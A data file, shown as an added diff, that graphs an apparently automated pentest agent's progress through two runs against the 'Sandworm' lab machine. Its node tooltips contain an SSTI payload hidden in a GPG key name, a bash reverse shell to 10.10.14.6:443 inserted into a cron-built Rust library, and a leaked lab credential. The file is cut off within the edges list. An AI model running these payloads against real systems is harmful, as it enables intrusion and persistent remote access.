@@ -1,0 +1,912 @@
+{
+  "paper_analogy": "Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track",
+  "machine": "Sandworm",
+  "source": "training_data.csv, Machine == 'Sandworm', 5 row(s), 2 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
+  "analogy_mapping": {
+    "Agent Nodes": "PTT snapshot reached after each new tree item (state = cumulative tree)",
+    "Search Nodes": "The PTT tree item worked on (number + title) + its MCP_tasks tool calls",
+    "Track Nodes": "That item's findings payload -- what was actually discovered"
+  },
+  "legend": {
+    "node_types": {
+      "Agent (Blue/Pink goal)": "PTT state after a new item completes",
+      "Search (Orange)": "PTT item being worked (tool calls in tooltip)",
+      "Track (Green)": "Findings payload of that item"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "Agent -> Agent, label = PTT item number",
+      "SearchUpdate (Green)": "Agent -> Search, item being worked from that state",
+      "TrackUpdate (Blue)": "Search -> Track, what item's execution found",
+      "Prediction (Purple)": "Track -> Agent, leads to next cumulative PTT state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "agent:Sandworm:START",
+      "label": "Agent: Initial\n(Start)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Start of pentest against 'Sandworm'. 2 recorded run(s) below.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s1_2",
+      "label": "Search: 2\nExploit SSTI via PGP key \u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 2: Exploit SSTI via PGP key usernames\n\nMCP tool calls:\nNmap: Scan target for SSH (22), HTTP (80), HTTPS (443) on Ubuntu 22.04; Dirbuster: Enumerate web directories discovering admin and login functionality; Web page interaction: Test PGP encryption, decryption, and signature verification endpoints; Interactive CLI: Analyze Flask framework indicators",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s1_2",
+      "label": "Track: Exploit SSTI via PGP key user\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 2 Exploit SSTI via PGP key usernames:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s1_2",
+      "label": "Agent: 2\nExploit SSTI via PGP \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 2:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u25cb 2 Exploit SSTI via PGP key usernames\n  \u25cb 2.1 Test GPG key username processing\n  \u25cb 2.2 Achieve remote code execution",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s1_2.1",
+      "label": "Search: 2.1\nTest GPG key username pro\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 2.1: Test GPG key username processing\n\nMCP tool calls:\nNmap: Scan target for SSH (22), HTTP (80), HTTPS (443) on Ubuntu 22.04; Dirbuster: Enumerate web directories discovering admin and login functionality; Web page interaction: Test PGP encryption, decryption, and signature verification endpoints; Interactive CLI: Analyze Flask framework indicators",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s1_2.1",
+      "label": "Track: Test GPG key username process\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 2.1 Test GPG key username processing:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s1_2.1",
+      "label": "Agent: 2.1\nExploit SSTI via PGP \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 2.1:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u25cb 2 Exploit SSTI via PGP key usernames\n  \u25cb 2.1 Test GPG key username processing\n  \u25cb 2.2 Achieve remote code execution",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s1_2.2",
+      "label": "Search: 2.2\nAchieve remote code execu\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 2.2: Achieve remote code execution\n\nMCP tool calls:\nNmap: Scan target for SSH (22), HTTP (80), HTTPS (443) on Ubuntu 22.04; Dirbuster: Enumerate web directories discovering admin and login functionality; Web page interaction: Test PGP encryption, decryption, and signature verification endpoints; Interactive CLI: Analyze Flask framework indicators",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s1_2.2",
+      "label": "Track: Achieve remote code execution",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 2.2 Achieve remote code execution:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s1_2.2",
+      "label": "Agent: 2.2\nExploit SSTI via PGP \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 2.2:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u25cb 2 Exploit SSTI via PGP key usernames\n  \u25cb 2.1 Test GPG key username processing\n  \u25cb 2.2 Achieve remote code execution",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s2_3",
+      "label": "Search: 3\nLateral movement to silen\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 3: Lateral movement to silentobserver\n\nMCP tool calls:\nInteractive CLI: Create GPG key with SSTI payload as username: gpg --gen-key with name {{ namespace.__init__.__globals__.os.popen('id').read() }}; Interactive CLI: Sign test message with malicious key; Web page interaction: Submit signed message to verification endpoint; Interactive CLI: Confirm command execution in response; Interactive CLI: Deploy base64-encoded reverse shell via SSTI",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s2_3",
+      "label": "Track: Lateral movement to silentobs\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 3 Lateral movement to silentobserver:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s2_3",
+      "label": "Agent: 3\nLateral movement to s\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 3:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u25cb 3 Lateral movement to silentobserver\n  \u25cb 3.1 Enumerate system for credentials",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s2_3.1",
+      "label": "Search: 3.1\nEnumerate system for cred\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 3.1: Enumerate system for credentials\n\nMCP tool calls:\nInteractive CLI: Create GPG key with SSTI payload as username: gpg --gen-key with name {{ namespace.__init__.__globals__.os.popen('id').read() }}; Interactive CLI: Sign test message with malicious key; Web page interaction: Submit signed message to verification endpoint; Interactive CLI: Confirm command execution in response; Interactive CLI: Deploy base64-encoded reverse shell via SSTI",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s2_3.1",
+      "label": "Track: Enumerate system for credenti\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 3.1 Enumerate system for credentials:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s2_3.1",
+      "label": "Agent: 3.1\nLateral movement to s\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 3.1:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u25cb 3 Lateral movement to silentobserver\n  \u25cb 3.1 Enumerate system for credentials",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s3_4",
+      "label": "Search: 4\nEscape Firejail and escal\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 4: Escape Firejail and escalate to root\n\nMCP tool calls:\nInteractive CLI: Search atlas home directory for configuration files; Interactive CLI: Examine ~/.config/httpie/sessions/ directory; Interactive CLI: Read localhost_5000/admin.json session file; Interactive CLI: Extract credentials from httpie session configuration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s3_4",
+      "label": "Track: Escape Firejail and escalate \u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 4 Escape Firejail and escalate to root:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s3_4",
+      "label": "Agent: 4\nEscape Firejail and e\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 4:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u2713 3 Lateral movement to silentobserver\n  \u2713 3.1 Enumerate system for credentials\n\u25cb 4 Escape Firejail and escalate to root\n  \u25cb 4.1 Return to atlas user outside jail\n  \u25cb 4.2 Exploit Firejail CVE for root access",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s3_4.1",
+      "label": "Search: 4.1\nReturn to atlas user outs\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 4.1: Return to atlas user outside jail\n\nMCP tool calls:\nInteractive CLI: Search atlas home directory for configuration files; Interactive CLI: Examine ~/.config/httpie/sessions/ directory; Interactive CLI: Read localhost_5000/admin.json session file; Interactive CLI: Extract credentials from httpie session configuration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s3_4.1",
+      "label": "Track: Return to atlas user outside \u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 4.1 Return to atlas user outside jail:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s3_4.1",
+      "label": "Agent: 4.1\nEscape Firejail and e\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 4.1:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u2713 3 Lateral movement to silentobserver\n  \u2713 3.1 Enumerate system for credentials\n\u25cb 4 Escape Firejail and escalate to root\n  \u25cb 4.1 Return to atlas user outside jail\n  \u25cb 4.2 Exploit Firejail CVE for root access",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r1_s3_4.2",
+      "label": "Search: 4.2\nExploit Firejail CVE for \u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/2] PTT item 4.2: Exploit Firejail CVE for root access\n\nMCP tool calls:\nInteractive CLI: Search atlas home directory for configuration files; Interactive CLI: Examine ~/.config/httpie/sessions/ directory; Interactive CLI: Read localhost_5000/admin.json session file; Interactive CLI: Extract credentials from httpie session configuration",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r1_s3_4.2",
+      "label": "Track: Exploit Firejail CVE for root\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/2] 4.2 Exploit Firejail CVE for root access:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_s3_4.2",
+      "label": "Agent: 4.2\nEscape Firejail and e\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Cumulative PTT after 4.2:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u2713 3 Lateral movement to silentobserver\n  \u2713 3.1 Enumerate system for credentials\n\u25cb 4 Escape Firejail and escalate to root\n  \u25cb 4.1 Return to atlas user outside jail\n  \u25cb 4.2 Exploit Firejail CVE for root access",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r1_close",
+      "label": "Agent: Run End\n(no further PTT growth)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/2] Final cumulative PTT for this run:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u2713 3 Lateral movement to silentobserver\n  \u2713 3.1 Enumerate system for credentials\n\u25cb 4 Escape Firejail and escalate to root\n  \u25cb 4.1 Return to atlas user outside jail\n  \u25cb 4.2 Exploit Firejail CVE for root access",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Sandworm:r2_base",
+      "label": "Search: Baseline\n(7 item(s))",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 2/2] Baseline recon already completed before this run's first tracked step:\n1.1 Scan for open ports and services\n1.2 Enumerate web application\n1.3 Identify PGP functionality\n2.1 Test GPG key username processing for SSTI\n2.2 Achieve remote code execution and obtain shell\n3.1 Enumerate system for credentials\n4.1 Return to atlas user outside jail via Rust library modification",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Sandworm:r2_base",
+      "label": "Track: Return to atlas user outs\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 2/2] 1.1 Scan for open ports and services: SSH (22), HTTP (80), HTTPS (443) on Ubuntu 22.04; SSL certificate reveals ssa.htb\n\n1.2 Enumerate web application: Flask framework; Secret Spy Agency website; PGP endpoints\n\n1.3 Identify PGP functionality: PGP-based message handling; Signature verification displays GPG key info\n\n2.1 Test GPG key username processing for SSTI: GPG key with SSTI payload; Command execution confirmed\n\n2.2 Achieve remote code execution and obtain shell: Base64-encoded reverse shell via SSTI; Shell as atlas inside Firejail\n\n3.1 Enumerate system for credentials: Found httpie config with silentobserver:quietLiketheWind22; SSH successful; Retrieved user.txt\n\n4.1 Return to atlas user outside jail via Rust library modification: Pspy revealed cron job cd /opt/tipnet && cargo run --offline executing every two minutes as atlas; Library file /opt/crates/logger/src/lib.rs writable by silentobserver; Modified log function adding Command::new(bash\").arg(\"-c\").arg(\"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\").output(); Cargo recompilation triggered by cron; Reverse shell established as atlas outside Firejail jail",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r2_base",
+      "label": "Agent: Baseline\nEscape Firejail and e\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 2/2] Cumulative PTT so far:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u2713 3 Lateral movement to silentobserver\n  \u2713 3.1 Enumerate system for credentials\n\u2713 4 Escape Firejail and escalate to root\n  \u2713 4.1 Return to atlas user outside jail via Rust library modification",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Sandworm:r2_close",
+      "label": "Agent: Run End\n(no further PTT growth)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 2/2] Final cumulative PTT for this run:\n\u2713 1 Perform reconnaissance on target system\n  \u2713 1.1 Scan for open ports and services\n  \u2713 1.2 Enumerate web application\n  \u2713 1.3 Identify PGP functionality\n\u2713 2 Exploit SSTI via PGP key usernames\n  \u2713 2.1 Test GPG key username processing for SSTI\n  \u2713 2.2 Achieve remote code execution and obtain shell\n\u2713 3 Lateral movement to silentobserver\n  \u2713 3.1 Enumerate system for credentials\n\u2713 4 Escape Firejail and escalate to root\n  \u2713 4.1 Return to atlas user outside jail via Rust library modification",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "agent:Sandworm:START",
+      "to": "agent:Sandworm:r1_s1_2",
+      "label": "\u2192 2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:START",
+      "to": "search:Sandworm:r1_s1_2",
+      "label": "2 Exploit SSTI via PG\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s1_2",
+      "to": "track:Sandworm:r1_s1_2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s1_2",
+      "to": "agent:Sandworm:r1_s1_2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s1_2",
+      "to": "agent:Sandworm:r1_s1_2.1",
+      "label": "\u2192 2.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s1_2",
+      "to": "search:Sandworm:r1_s1_2.1",
+      "label": "2.1 Test GPG key userna\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s1_2.1",
+      "to": "track:Sandworm:r1_s1_2.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s1_2.1",
+      "to": "agent:Sandworm:r1_s1_2.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s1_2.1",
+      "to": "agent:Sandworm:r1_s1_2.2",
+      "label": "\u2192 2.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s1_2.1",
+      "to": "search:Sandworm:r1_s1_2.2",
+      "label": "2.2 Achieve remote code\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s1_2.2",
+      "to": "track:Sandworm:r1_s1_2.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s1_2.2",
+      "to": "agent:Sandworm:r1_s1_2.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s1_2.2",
+      "to": "agent:Sandworm:r1_s2_3",
+      "label": "\u2192 3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s1_2.2",
+      "to": "search:Sandworm:r1_s2_3",
+      "label": "3 Lateral movement to\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s2_3",
+      "to": "track:Sandworm:r1_s2_3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s2_3",
+      "to": "agent:Sandworm:r1_s2_3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s2_3",
+      "to": "agent:Sandworm:r1_s2_3.1",
+      "label": "\u2192 3.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s2_3",
+      "to": "search:Sandworm:r1_s2_3.1",
+      "label": "3.1 Enumerate system fo\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s2_3.1",
+      "to": "track:Sandworm:r1_s2_3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s2_3.1",
+      "to": "agent:Sandworm:r1_s2_3.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s2_3.1",
+      "to": "agent:Sandworm:r1_s3_4",
+      "label": "\u2192 4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s2_3.1",
+      "to": "search:Sandworm:r1_s3_4",
+      "label": "4 Escape Firejail and\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s3_4",
+      "to": "track:Sandworm:r1_s3_4",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s3_4",
+      "to": "agent:Sandworm:r1_s3_4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s3_4",
+      "to": "agent:Sandworm:r1_s3_4.1",
+      "label": "\u2192 4.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s3_4",
+      "to": "search:Sandworm:r1_s3_4.1",
+      "label": "4.1 Return to atlas use\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s3_4.1",
+      "to": "track:Sandworm:r1_s3_4.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s3_4.1",
+      "to": "agent:Sandworm:r1_s3_4.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s3_4.1",
+      "to": "agent:Sandworm:r1_s3_4.2",
+      "label": "\u2192 4.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s3_4.1",
+      "to": "search:Sandworm:r1_s3_4.2",
+      "label": "4.2 Exploit Firejail CV\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Sandworm:r1_s3_4.2",
+      "to": "track:Sandworm:r1_s3_4.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Sandworm:r1_s3_4.2",
+      "to": "agent:Sandworm:r1_s3_4.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Sandworm:r1_s3_4.2",
+      "to": "agent:Sandworm:r1_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
